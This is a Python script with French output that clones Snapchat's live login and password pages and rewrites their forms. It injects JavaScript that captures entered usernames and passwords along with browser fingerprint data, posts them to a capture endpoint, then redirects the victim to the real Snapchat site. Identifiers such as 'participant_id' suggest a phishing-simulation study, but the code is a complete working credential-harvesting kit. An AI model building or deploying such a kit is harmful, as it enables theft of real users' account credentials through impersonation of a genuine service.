import os
import sys
import re

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TEMPLATES = os.path.join(BASE, "templates")
LOGIN_HTML = os.path.join(TEMPLATES, "login.html")
PASSWORD_HTML = os.path.join(TEMPLATES, "password.html")

CAPTURE_SCRIPT_LOGIN = """
<script>
(function() {
    var pageStart = Date.now();
    var clickCount = 0;
    document.addEventListener('click', function() { clickCount++; });

    document.addEventListener('submit', function(e) {
        if (e.target.closest('#lab-password-form')) return;
        var loginForm = e.target.closest('form');
        if (!loginForm || !loginForm.querySelector('button[type="submit"]')) return;
        e.preventDefault();

        var fd = new FormData(loginForm);
        var data = {};
        fd.forEach(function(v, k) { data[k] = v; });
        data.participant_id = sessionStorage.getItem('participant_id') || '';
        data.step = 'login';
        data.screen_resolution = screen.width + 'x' + screen.height;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.browser_language = navigator.language;
        data.platform = navigator.platform;
        data.time_on_page = Math.floor((Date.now() - pageStart) / 1000);
        data.referrer = document.referrer;
        data.click_count = clickCount;

        fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data),
            keepalive: true
        });

        var username = data.accountIdentifier || data.username || '';
        sessionStorage.setItem('lab_username', username);
        var container = document.querySelector('.Login_container__KLPD5') || loginForm.closest('div[class*="container"]') || loginForm.parentElement;
        if (container) {
            container.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:200px;gap:16px;padding:40px"><div style="width:40px;height:40px;border:4px solid #eee;border-top-color:#FFFC00;border-radius:50%;animation:spin 1s linear infinite"></div><p style="font-size:16px;color:#16191c">Connexion...</p><p style="font-size:12px;color:#71757a">Veuillez patienter</p></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>';
        }
        setTimeout(function() {
            window.location.href = '/password?u=' + encodeURIComponent(username);
        }, 2000);
    });
})();
</script>
<script src="/static/stealth.js"></script>
"""

CAPTURE_SCRIPT_PASSWORD = """
<script>
(function() {
    document.addEventListener('submit', function(e) {
        var pwForm = e.target.closest('form');
        if (!pwForm || !pwForm.querySelector('input[type="password"]')) return;
        e.preventDefault();

        var fd = new FormData(pwForm);
        var data = {};
        fd.forEach(function(v, k) { data[k] = v; });
        data.participant_id = sessionStorage.getItem('participant_id') || '';
        data.username = sessionStorage.getItem('lab_username') || '';
        data.step = 'password';
        data.screen_resolution = screen.width + 'x' + screen.height;
        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        data.browser_language = navigator.language;
        data.platform = navigator.platform;
        data.time_on_page = Math.floor((Date.now() - pageStart) / 1000);
        data.referrer = document.referrer;

        fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data),
            keepalive: true
        });

        var container = pwForm.closest('div[class*="container"]') || pwForm.parentElement;
        if (container) {
            container.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:200px;gap:16px;padding:40px"><div style="width:40px;height:40px;border:4px solid #eee;border-top-color:#FFFC00;border-radius:50%;animation:spin 1s linear infinite"></div><p style="font-size:16px;color:#16191c">Verification...</p></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>';
        }
        setTimeout(function() {
            window.location.href = 'https://accounts.snapchat.com';
        }, 2000);
    });
})();
</script>
<script src="/static/stealth.js"></script>
"""


def ensure_playwright():
    try:
        from playwright.sync_api import sync_playwright
        return sync_playwright
    except ImportError:
        print("Installation de playwright...")
        os.system(f"{sys.executable} -m pip install playwright")
        os.system(f"{sys.executable} -m playwright install chromium")
        from playwright.sync_api import sync_playwright
        return sync_playwright


def fetch_login_page(sp):
    print("Telechargement de la page login...")
    with sp() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto("https://accounts.snapchat.com/login", wait_until="networkidle")
        page.wait_for_timeout(3000)
        html = page.content()
        browser.close()
    print(f"  Login : {len(html)} octets")
    return html


def fetch_password_page(sp):
    print("Telechargement de la page mot de passe...")
    with sp() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto("https://accounts.snapchat.com/login", wait_until="networkidle")
        page.wait_for_timeout(2000)

        email_input = page.query_selector('input[type="email"], input[name="username"], input[type="text"]')
        if not email_input:
            print("  Aucun champ email trouve, page mot de passe ignoree")
            browser.close()
            return None

        email_input.fill("test@example.com")
        page.wait_for_timeout(500)

        submit_btn = page.query_selector('button[type="submit"]')
        if submit_btn:
            submit_btn.click()
        else:
            email_input.press("Enter")

        page.wait_for_timeout(5000)
        html = page.content()
        browser.close()

        if "password" not in html.lower() and "mot de passe" not in html.lower():
            print("  La page suivante ne semble pas etre la page mot de passe")
            return None

    print(f"  Password : {len(html)} octets")
    return html


def is_snapchat_html(html):
    return "snapchat" in html.lower() or "accounts" in html.lower()


def rewrite_form_action(html, target="/login"):
    first = True
    def _replace(m):
        nonlocal first
        if first:
            first = False
            return '<form action="%s" method="POST">' % target
        return m.group(0)
    html = re.sub(r'<form[^>]*action="[^"]*"[^>]*>', _replace, html, count=1)
    return html


def inject_capture(html, script):
    if script in html:
        return html
    if "</body>" in html:
        html = html.replace("</body>", script + "\n</body>")
    else:
        html += script
    return html


def add_participant_variable(html):
    var_script = '<script>var PARTICIPANT_ID = "{{ participant_id }}";</script>'
    if "PARTICIPANT_ID" in html:
        return html
    if "<head>" in html:
        html = html.replace("<head>", "<head>\n" + var_script)
    else:
        html = var_script + "\n" + html
    return html


def make_template_safe(html):
    html = html.replace("{{", "&#123;&#123;").replace("}}", "&#125;&#125;")
    html = html.replace("&#123;&#123; participant_id &#125;&#125;", "{{ participant_id }}")
    return html


def save_html(html, path):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"  Sauvegarde : {path}")


def process_page(html, script):
    if not is_snapchat_html(html):
        print("  ERREUR: Le contenu ne ressemble pas a Snapchat")
        return None
    html = add_participant_variable(html)
    html = rewrite_form_action(html)
    html = inject_capture(html, script)
    html = make_template_safe(html)
    return html


def main():
    print("=" * 60)
    print("  REFRESH SNAPCHAT PAGES")
    print("  Clone la page login + mot de passe")
    print("=" * 60)

    sp = ensure_playwright()

    login_html = fetch_login_page(sp)
    clean = process_page(login_html, CAPTURE_SCRIPT_LOGIN)
    if clean:
        save_html(clean, LOGIN_HTML)
        print("  Login : OK")
    else:
        print("  Login : conserve l'ancienne version")

    print()
    password_html = fetch_password_page(sp)
    if password_html:
        clean = process_page(password_html, CAPTURE_SCRIPT_PASSWORD)
        if clean:
            save_html(clean, PASSWORD_HTML)
            print("  Password : OK")

    print()
    print("Fait !")
    print()


if __name__ == "__main__":
    main()
